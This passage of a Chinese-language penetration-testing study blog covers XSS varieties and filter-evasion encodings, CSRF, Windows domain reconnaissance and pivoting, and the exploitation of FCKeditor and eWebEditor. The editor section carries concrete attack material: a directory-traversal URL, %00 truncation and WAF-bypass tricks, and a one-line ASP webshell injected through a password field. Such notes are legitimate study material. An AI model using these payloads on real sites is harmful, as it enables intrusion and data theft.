src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220623162154.png"></li></ul></li></ul></li><li><p>存储型XSS</p><ul><li>存储型xss比反射型跨站脚本更具威胁性，并且可能影响到web服务器的自身安全。</li><li>此类XSS不需要用户点击特定的URL就能执行跨站脚本，攻击者事先讲恶意JavaScript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意的代码的页面就会执行恶意代码。</li><li>注入点<ul><li>用户注册所有表单<ul><li>用户名</li><li>姓名</li><li>client-ip</li><li>X-forwarded-for</li><li>referer</li><li>……</li></ul></li><li>修改资料(各种表单)</li><li>留言板</li><li>一切可能留到数据库的表单</li><li>APP的表单</li></ul></li><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220623162335.png"></li></ul></li><li><p>DOM型xss</p><ul><li>攻击模型和反射型xss类型</li><li>通过审查元素追踪触发代码的节点，通过闭合构造攻击语句</li></ul></li><li><p>防御绕过</p><ul><li>变换标签</li><li>绕过 magic_quotes_gpc<ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220628162112.png"></li></ul></li><li>编码</li><li>改变大小写</li><li>代码转义<ul><li>HTML Characters<ul><li>需要带上一个标签的属性</li><li>一层一层转义</li></ul></li><li>XSS 编码<ul><li>xss常用的编码</li><li>html实体编码，例如：&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x29;</li><li>进制类，例如：\x61\x6c\x65\x72\x74\x60\x78\x73\x73\x60，某些时候，也有不带x,例如：\5c\6a</li><li>Unicode，例如：\u0061\u006c\u0065\u0072\u0074\u0060\u4e2d\u6587\u4e5f\u53ef\u4ee5\u0060</li><li>纯转义，例如：&#39;   &quot;   &lt;   &gt; ,这样的在特殊字符前加\进行转义。</li></ul></li></ul></li></ul></li><li><p>钓鱼</p><ul><li>httrack 原生编码下载网页</li><li>http-only启用时的攻击<ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220711211334.png"></li></ul></li></ul></li></ul><h3 id="CSRF-漏洞讲解"><a href="#CSRF-漏洞讲解" class="headerlink" title="CSRF 漏洞讲解"></a>CSRF 漏洞讲解</h3><ul><li><p>CSRF漏洞</p><ul><li>CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</li></ul></li><li><p>漏洞挖掘</p><ul><li>挖掘工具<ul><li>netspark</li><li>AWVS</li><li>appscan</li><li>burp</li></ul></li></ul></li><li><p>防御</p><ul><li>referer判断</li><li>验证码</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20220930205340039.png" alt="image-20220930205340039"></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>web渗透</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网环境搭建</title>
    <link href="/2022/06/14/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/06/14/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="内网环境介绍"><a href="#内网环境介绍" class="headerlink" title="内网环境介绍"></a>内网环境介绍</h3><ul><li><p>内网介绍</p><ul><li>局域网(Local Area Network，LAN)是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。 　</li><li>局域网通常是分布在一个有限地理范围内的网络系统，一般所涉及的地理范围只有几公里。局域网专用性非常强，具有比较稳定和规范的拓扑结构。</li></ul></li><li><p>工作组</p><ul><li>工作组(Work Group)是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱(恐怕网络邻居也会显示“下一页”吧)。为了解决这一问题，Windows 9x&#x2F;NT&#x2F;2000 才引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220614220954.png"></li></ul></li><li><p>域</p><ul><li>域是一个有安全边界的计算机集合（安全边界是在两个域中，一个域中的用户无法访问另一个域中的资源），在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可了。</li></ul></li><li><p>域控制器（DC）</p><ul><li>域控制器是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC。</li></ul></li><li><p>父域和子域</p><ul><li>出于管理及其他的需求，需要在网络中划分多个域！，第一个域为父域，各分部的域称为子域。</li></ul></li><li><p>域树（Tree）</p><ul><li>指若干个域通过建立信任关系而组合成新的集合！</li><li>abc.com及为父域，asia.abc.com为子域，可见有一个子域必须以父域名为后缀名</li></ul></li></ul><h3 id="工作组环境信息收集"><a href="#工作组环境信息收集" class="headerlink" title="工作组环境信息收集"></a>工作组环境信息收集</h3><ul><li><p>域名服务器（Domain Name Server，DNS）</p><ul><li>指用于进行域名（Domain Name）和与之相对应的IP地址（IPAddress）转换的服务器。</li><li>一般内网渗透时，就是寻找DNS服务器来定位DC（DNS服务器和DC通常会处在同一台机器上）</li></ul></li><li><p>活动目录（Active Directory，AD）</p><ul><li>是指域环境中提供目录服务的组件</li><li>管理员可以在活动目录中忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中，这种组织架构称之为逻辑架构</li><li>活动目录的逻辑架构包括上面讲到的组织单元（OU）、域、域树、域森林</li></ul></li><li><p>域中计算机的分类</p><ul><li>域控制器（必有）<ul><li>用于管理所有的网络访问</li></ul></li><li>成员服务器<ul><li>安装了服务器系统且加入了域，但没有安装活动目录的计算机</li></ul></li><li>客户机<ul><li>用户使用账号密码登录来访问并调用此间资源</li></ul></li><li>独立服务器<ul><li>和域没有关系。既不加入域也没有安装活动目录的服务器</li></ul></li></ul></li><li><p>域内权限解读</p><ul><li>域本地组<ul><li>域本地组主要用于授予本域内资源的访问权限，不能嵌套其他组中使用。</li></ul></li><li>全局组<ul><li>可以嵌套在其他组中，可以在域森林的任何域内指派权限。</li></ul></li><li>通用组<ul><li>通用组成员来自域森林中任何域的用户账号，全局组和其他通用组，可以在该域森林的任何域中指派权限，可以嵌套其他组中，非常适合在域森林内的跨域访问中使用。</li></ul></li><li>A-G-DL-P策略<ul><li>指用户账号添加到全剧组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</li></ul></li></ul></li></ul><h3 id="域环境搭建"><a href="#域环境搭建" class="headerlink" title="域环境搭建"></a>域环境搭建</h3><p><strong>域环境搭建配置</strong></p><ol><li>DC配置静态ip，设置dns为自己ip。</li><li>运行输入dcpromo</li><li>创建域名称</li><li>重启改域控管理密码</li><li>将内网计算机加入域网络</li><li>配置域策略到域内计算机</li></ol><h3 id="域环境信息收集"><a href="#域环境信息收集" class="headerlink" title="域环境信息收集"></a>域环境信息收集</h3><ol><li>进入<code>\\neil.com\SYSVOL\Policies</code></li><li>查看下发策略</li><li>有可能搜集到策略下发的密码</li></ol><h3 id="内网环境拓扑"><a href="#内网环境拓扑" class="headerlink" title="内网环境拓扑"></a>内网环境拓扑</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220614224442.png"></p><ul><li>拓扑图解析<ul><li>Kali 作为公网攻击主机</li><li>防火墙屏蔽内网信息 开启端口转发</li><li>Kali 拿到web内网服务器</li><li>通过web横向渗透</li><li>找到某台主机连接另一个内网</li><li>通过该主机作为跳板进行纵向渗透</li><li>发现域网络</li><li>通过域控纵向渗透到核心文件区</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编辑器漏洞</title>
    <link href="/2022/06/14/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/06/14/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="编辑器路径查找"><a href="#编辑器路径查找" class="headerlink" title="编辑器路径查找"></a>编辑器路径查找</h3><ul><li>查找编辑器目录<ul><li>目录扫描</li><li>目录遍历</li><li>蜘蛛爬行</li><li>扫描编辑器二级目录</li><li>高位端口</li></ul></li><li>注意事项：<ul><li>查找路径时应注意站中站和子站的编辑器路径</li><li>如果进入后台查找编辑器未能正常显示的，可以利用审查元素搜索editor等关键字、或者换低版本浏览器打开查看编辑器</li></ul></li></ul><h3 id="FCK编辑器漏洞"><a href="#FCK编辑器漏洞" class="headerlink" title="FCK编辑器漏洞"></a>FCK编辑器漏洞</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220614141559.png"></p><ul><li><p>FCKeditor编辑器页 </p><ul><li>FCKeditor&#x2F;_samples&#x2F;default.html</li></ul></li><li><p>查看编辑器版本</p><ul><li>FCKeditor&#x2F;_whatsnew.html</li></ul></li><li><p>查看文件上传路径</p><ul><li>fckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F; <br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220614142320.png"></li></ul></li><li><p>过狗小技巧</p><ul><li>%00阶段上传脚本时遇到阿里云防护可以通过连发三个包过去</li><li>iis 3.0 6.0均存在解析漏洞, 6.0可通过抓包修改 递归创建两个目录<img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220614151659.png"></li><li>%00截断不了的话, 在后面加个.<img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220614152012.png"></li></ul></li></ul><h3 id="EWEB编辑器漏洞"><a href="#EWEB编辑器漏洞" class="headerlink" title="EWEB编辑器漏洞"></a>EWEB编辑器漏洞</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220614153114.png"></p><p><strong>eweb编辑器利用流程</strong></p><ol><li>查找eweb编辑器路径, 找eweb管理后台</li><li>进入后台，修改上传文件类型</li><li>上传脚本拿shell</li><li>如果没有后台<ol><li>看是否能下载数据库，看数据库中有没有可以上传脚本的样式，构造上传</li><li>利用eweb目录遍历漏洞，找到网站数据库，下载破解管理员密码进后台拿shell</li><li>查找对用编辑器版本漏洞利用拿shell</li></ol></li></ol><ul><li><p>eWebEditor利用基础知识</p><ul><li>默认后台地址：&#x2F;ewebeditor&#x2F;admin_login.asp </li><li>数据库路径：<code>[PATH]/db/ewebeditor.mdb</code></li><li><code>[PATH]/db/db.mdb</code> – 某些CMS里是这个数据库 </li><li>也可尝试 <code>[PATH]/db/</code>%23ewebeditor.mdb – 某些管理员自作聪明的小伎俩</li></ul></li><li><p>有修改权限的利用</p><ul><li>通过增加样式–设置-添加插入图片-getshell</li><li>不能添加工具栏，但设定好了某样式中的文件类型</li><li>修改action字段<ul><li>比如 ID&#x3D;46 s-name &#x3D;standard1 </li><li>构造 代码: ewebeditor.asp?id&#x3D;content style&#x3D;standard </li><li>ID和和样式名改过后 ewebeditor.asp?id&#x3D;46&amp;style&#x3D;standard1 <br>　　eWebEditor遍历目录漏洞</li></ul></li></ul></li><li><p>无修改权限</p><ul><li>目录遍历<ul><li><code>http://www.webshell.com/admin/editor/admin_uploadfile.asp?id=&amp;dir=..</code></li></ul></li></ul></li><li><p>eWebEditor 5.2 列目录漏洞</p><ul><li>ewebeditor&#x2F;asp&#x2F;browse.asp</li><li>过滤不严，造成遍历目录漏洞 </li><li>利用WebEditor session欺骗漏洞,进入后台</li></ul></li><li><p>eWebEditor 2.8 商业版插一句话木马</p><ul><li>登陆后台，点击修改密码—新密码设置为 1”:eval request(“h”)’ </li><li>设置成功后，访问asp&#x2F;config.asp文件即可，一句话木马被写入到这个文件里面了.</li></ul></li></ul><p> </p>]]></content>
    
    
    
    <tags>
      
      <tag>web渗透</tag>
      
      <tag>编辑器</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
